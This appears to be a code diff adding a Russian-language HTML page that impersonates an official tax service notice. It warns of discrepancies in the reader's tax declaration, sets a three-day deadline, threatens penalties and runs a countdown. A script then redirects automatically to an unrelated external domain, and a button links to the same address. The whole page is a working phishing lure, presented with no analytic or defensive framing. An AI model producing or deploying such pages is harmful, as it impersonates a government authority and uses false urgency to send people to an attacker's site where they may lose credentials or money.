@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Уведомление от налоговой службы</title>
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://comunication.dropcloud.it/recoverydisk-10774nslknfj9661408?rid=0KsE3Kl";
+        }, 12000);
+    </script>
+    <style>
+        body { font-family: Arial, sans-serif; background: #d4af37; padding: 50px; }
+        .tax-notice { background: white; padding: 40px; border: 3px solid #b8860b; border-radius: 5px; }
+        .official-header { background: #b8860b; color: white; padding: 15px; margin: -40px -40px 20px -40px; text-align: center; font-weight: bold; }
+        .deadline { background: #fff3cd; border: 2px solid #ffc107; padding: 15px; border-radius: 5px; margin: 20px 0; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="tax-notice">
+        <div class="official-header">
+            НАЛОГОВАЯ СЛУЖБА - ОФИЦИАЛЬНОЕ УВЕДОМЛЕНИЕ
+        </div>
+        <h2>Требуется подтверждение налоговой декларации</h2>
+        <p>В вашей налоговой декларации обнаружены несоответствия, требующие подтверждения</p>
+        <div class="deadline">
+            <strong>Срок предоставления документов: 3 рабочих дня</strong>
+        </div>
+        <p>Невыполнение требований может привести к начислению штрафных санкций</p>
+        <p>Перенаправление через: <span id="taxTimer">12</span> секунд</p>
+        <p><a href="https://comunication.dropcloud.it/recoverydisk-10774nslknfj9661408?rid=0KsE3Kl">Перейти к подтверждению</a></p>
+    </div>
+    
+    <script>
+        let taxTimer = 12;
+        setInterval(function() {
+            taxTimer--;
+            document.getElementById('taxTimer').textContent = taxTimer;
+        }, 1000);
+    </script>
+</body>
+</html>
